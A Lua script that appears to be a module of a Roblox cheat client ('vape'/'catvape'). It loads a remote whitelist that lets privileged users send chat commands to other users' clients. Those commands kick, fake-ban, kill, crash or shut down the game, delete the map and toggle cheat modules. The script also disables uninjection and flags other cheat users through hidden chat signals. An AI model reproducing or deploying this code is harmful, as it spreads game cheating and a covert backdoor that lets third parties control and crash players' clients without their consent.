local serv = setmetatable({}, {
    __index = function(self, index)
        self[index] = game:GetService(index)
        return self[index]
    end
})
local lplr = serv.Players.LocalPlayer
local vape = shared.vape
local textChatService = game:GetService('TextChatService') -- ik theres a serv table
local chatSignals = setmetatable({}, {
    __index = function(self, index)
        self[index] = Instance.new('BindableEvent')
        return self[index]
    end
})

vape.Libraries.CatWhitelisted = true

local function weld(part1, part2)
    local weldConstraint = Instance.new("WeldConstraint", part1)
    weldConstraint.Part0 = part1
    weldConstraint.Part1 = part2
end

local function transformImage(img, txt)
    local function funnyfunc(v)
        if v:GetFullName():find("ExperienceChat") == nil then
            if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                v.Image = img
                v:GetPropertyChangedSignal("Image"):Connect(function()
                    v.Image = img
                end)
            end
            if (v:IsA("TextLabel") or v:IsA("TextButton")) then
                if v.Text ~= "" then
                    v.Text = txt
                end
                v:GetPropertyChangedSignal("Text"):Connect(function()
                    if v.Text ~= "" then
                        v.Text = txt
                    end
                end)
            end
            if v:IsA("Texture") or v:IsA("Decal") then
                v.Texture = img
                v:GetPropertyChangedSignal("Texture"):Connect(function()
                    v.Texture = img
                end)
            end
            if v:IsA("MeshPart") then
                v.TextureID = img
                v:GetPropertyChangedSignal("TextureID"):Connect(function()
                    v.TextureID = img
                end)
            end
            if v:IsA("SpecialMesh") then
                v.TextureId = img
                v:GetPropertyChangedSignal("TextureId"):Connect(function()
                    v.TextureId = img
                end)
            end
            if v:IsA("Sky") then
                v.SkyboxBk = img
                v.SkyboxDn = img
                v.SkyboxFt = img
                v.SkyboxLf = img
                v.SkyboxRt = img
                v.SkyboxUp = img
            end
        end
    end

    for i,v in game:GetDescendants() do
        funnyfunc(v)
    end

    game.DescendantAdded:Connect(funnyfunc)
end

local wlplrs = {}
local dtcTable = {}
local commands = {
    kick = function(...)
        lplr:Kick(table.concat({...}, ' '))
    end,
    ban = function()
        lplr:Kick('You have been temporarily banned.\n[Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds]')
    end,
    trip = function()
        lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
    end,
    kill = function()
        if vape.Libraries.entity.isAlive then
            lplr.Character.Humanoid.Health = 0
        end
    end,
    toggle = function(args)
        if #args < 1 then return end
        if args[1]:lower() == 'all' then
            for i, v in vape.Modules do
                if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
                    v:Toggle()
                end
            end
        else
            for i, v in vape.Modules do
                if i:lower() == args[1]:lower() then
                    v:Toggle()
                    break
                end
            end
        end
    end,
    shutdown = function()
        game:Shutdown()
    end,
    framerate = function(fps)
        fps = fps and tonumber(fps)
        setfpscap(fps or 60)
    end,
    uninject = function()
        vape:Uninject()
    end,
    lagback = function()
        lplr.Character.PrimaryPart.CFrame += Vector3.new(math.huge, 0, math.huge)
        lplr.Character.PrimaryPart.Velocity += Vector3.new(9e9, 0, 9e9)
    end,
    gravity = function(arg)
        workspace.Gravity = arg or 196.2
    end,
    reveal = function()
        for i,v in wlplrs do
            dtcTable[v] = false
            if serv.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
            else
                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatvape', v.Name)
            end
        end
    end,
    pistonwarenut = function()
        serv.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('ima leave instead i dont wanna be nutted by cat members...')
        task.wait(0.7)
        game:Shutdown()
        delay(0.5, function()
            while true do end
        end)
    end,
    deletemap = function()
        local terrain = workspace:FindFirstChildWhichIsA('Terrain')
        if terrain then
            terrain:Clear()
        end

        for _, v in workspace:GetChildren() do
            if v ~= terrain and not v:IsDescendantOf(lplr.Character) and not v:IsA('Camera') then
                v:Destroy()
                v:ClearAllChildren()
            end
        end
    end,
    void = function()
        lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
    end,
    notify = function(...)
        vape:CreateNotification('Cat', table.concat({...}, ' '), 15, 'info')
    end,
    chipman = function()
        transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
    end,
    rickroll = function()
        transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
    end,
    piston = function()
        transformImage("http://www.roblox.com/asset/?id=13988229521", "pistonware nut 🥵")
    end,
    josiah = function()
        transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
    end,
    xylex = function()
        transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
    end,
    pp = function()
        local character = game.Players.LocalPlayer.Character
        local primaryPart = character.PrimaryPart

        local ball1 = Instance.new("Part", character)
        ball1.CFrame = primaryPart.CFrame * CFrame.new(0.35, -1.55, -1)
        ball1.Size = Vector3.new(1.5, 1.5, 1.5)
        weld(ball1, primaryPart)
        Instance.new("SpecialMesh", ball1).MeshType = "Sphere"

        local ball2 = Instance.new("Part", character)
        ball2.CFrame = primaryPart.CFrame * CFrame.new(-0.35, -1.55, -1)
        ball2.Size = Vector3.new(1.5, 1.5, 1.5)
        weld(ball2, primaryPart)
        Instance.new("SpecialMesh", ball2).MeshType = "Sphere"

        local ball3 = Instance.new("Part", character)
        ball3.CFrame = primaryPart.CFrame * CFrame.new(0, -1.15, -4)
        ball3.Size = Vector3.new(1.3, 1.3, 1.3)
        weld(ball3, primaryPart)
        Instance.new("SpecialMesh", ball3).MeshType = "Sphere"

        local longPart = Instance.new("Part", character)
        longPart.CFrame = primaryPart.CFrame * CFrame.new(0, -1.15, -2)
        longPart.Size = Vector3.new(4, 1.3, 1.3)
        longPart.Orientation = longPart.Orientation + Vector3.new(0, 90, 0)
        longPart.Shape = "Cylinder"
        weld(longPart, primaryPart)

        local skinColor = Color3.fromRGB(255, 204, 153)
        local tipColor = Color3.fromRGB(255, 102, 204)

        longPart.Color = skinColor
        ball1.Color = skinColor
        ball2.Color = skinColor
        ball3.Color = tipColor

    end,
    chat = function(...)
        serv.TextChatService.TextChannels.RBXGeneral:SendAsync(table.concat({...}, ' '))
    end,
    crash = function()
        local sgui = Instance.new("ScreenGui", game.CoreGui)
        local frame = Instance.new("Frame", sgui)
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.Size = UDim2.new(-50, 5000, -50, 5000)
        task.delay(0.1, function()
            while true do end
        end)
    end
}

local response = serv.HttpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/ah2r/whitelist/main/whitelist.json'))

local function getUserByHash(hash)
    for i,v in response.WhitelistedUsers do
        if not v or typeof(v) ~= 'table' then continue end
        local hash1 = v.hash:lower():gsub(' ', '')
        local hash2 = hash:lower():gsub(' ', '')
        if hash1 == hash2 then
            return v
        end
    end
end

local selfWhitelisted = response.WhitelistedUsers[tostring(lplr.UserId)] or getUserByHash(vape.Libraries.hash.sha512(lplr.Name.. lplr.UserId.. 'SelfReport'))
local wldata = {}

local addplayer = function(v)
    local whitelistInfo = response.WhitelistedUsers[tostring(v.UserId)] or getUserByHash(vape.Libraries.hash.sha512(v.Name.. v.UserId.. 'SelfReport'))
    if whitelistInfo then
        table.insert(wlplrs, v)
        vape.Libraries.whitelist.customtags[v.Name] = {{text = whitelistInfo.tags[1].text, color = Color3.fromRGB(table.concat(whitelistInfo.tags[1].color))}}
        wldata[v] = whitelistInfo
        if not selfWhitelisted or selfWhitelisted and whitelistInfo.level > selfWhitelisted.level then
            table.insert(vape.Libraries.whitelist.ignores, v)
            chatSignals[v].Event:Connect(function(message)
                local command = message:split(' ')[1]:gsub(';', '')
                if command and commands[command] then
                    local args = message:split(' ')
                    if args[2] and (args[2]:lower() == v.Name:lower() or args[2]:lower() == v.DisplayName or args[2]:lower() == 'all' or args[2]:lower() == 'default') then
                        for i = 1, 2 do
                            table.remove(args, 1)
                        end
                        commands[command](unpack(args))
                    end
                end
            end)
            vape.Uninject = function() commands.notify('Failed to uninject') end
            if serv.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
            else
                serv.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('himynameiscatvape', 'All')
            end
        end
    end
end

if not shared.vape.hackerTable then
    shared.vape.hackerTable = {}
end

local hacks = {}
local addcatCheck = function(v)
    chatSignals[v].Event:Connect(function(message, metadata)
        if (metadata == 'catv5' or message == 'himynameiscatvape') and selfWhitelisted and not dtcTable[v] then
            dtcTable[v] = true
            table.insert(shared.vape.hackerTable, v)
            table.insert(hacks, v)
            vape.Libraries.whitelist.customtags[v.Name] = {{text = 'CAT USER', color = Color3.new(0, 0, 1)}}
            vape:CreateNotification('Cat', v.Name..' is using catvape', 20, 'alert')
        end
    end)
end

for i,v in serv.Players:GetPlayers() do
    if v ~= lplr then
        xpcall(function()
            addcatCheck(v)
        end, warn)
        xpcall(function()
            addplayer(v)
        end, warn)
    end
end

serv.Players.PlayerAdded:Connect(function(v)
    task.delay(10, function()
        xpcall(function()
            addcatCheck(v)
        end, warn)
        xpcall(function()
            addplayer(v)
        end, warn)
    end)
end)

task.spawn(function()
    local blocks = {}

    repeat
        local function func(message)
            if blocks[func] then return message end

            local class = Instance.new('TextChatMessageProperties')
            local properties = textChatService.ChatWindowConfiguration:DeriveNewMessageProperties()
            message.ChatWindowMessageProperties = properties

            if message.TextSource then
                local plr = serv.Players:GetPlayerByUserId(message.TextSource.UserId)

                if plr then
                    chatSignals[plr]:Fire(message.Text, message.Metadata)
                    if table.find(wlplrs, plr) then
                        local color = wldata[plr].tags[1].color
                        local tag = wldata[plr].tags[1].text
                        class.PrefixText = '<font color="rgb('.. table.concat(color, ',') .. ')">['.. tag.. ']</font> '.. message.PrefixText
                    elseif table.find(hacks, plr) then
                        class.PrefixText = '<font color="rgb(0, 0, 255)">[CAT USER]</font> '.. message.PrefixText
                    elseif plr == lplr and selfWhitelisted then
                        local color = selfWhitelisted.tags[1].color
                        local tag = selfWhitelisted.tags[1].text
                        class.PrefixText = '<font color="rgb('.. table.concat(color, ',') .. ')">['.. tag.. ']</font> '.. message.PrefixText
                    end
                end
            end

            return class
        end

        textChatService.OnIncomingMessage = func

        task.wait(5)
        for i,v in wlplrs do
            if not selfWhitelisted or response.WhitelistedUsers[tostring(v.UserId)].level < selfWhitelisted.level then
                serv.TextChatService.TextChannels.RBXGeneral:SendAsync('', 'catv5')
                break
            end
        end
        blocks[func] = true
    until false
end)
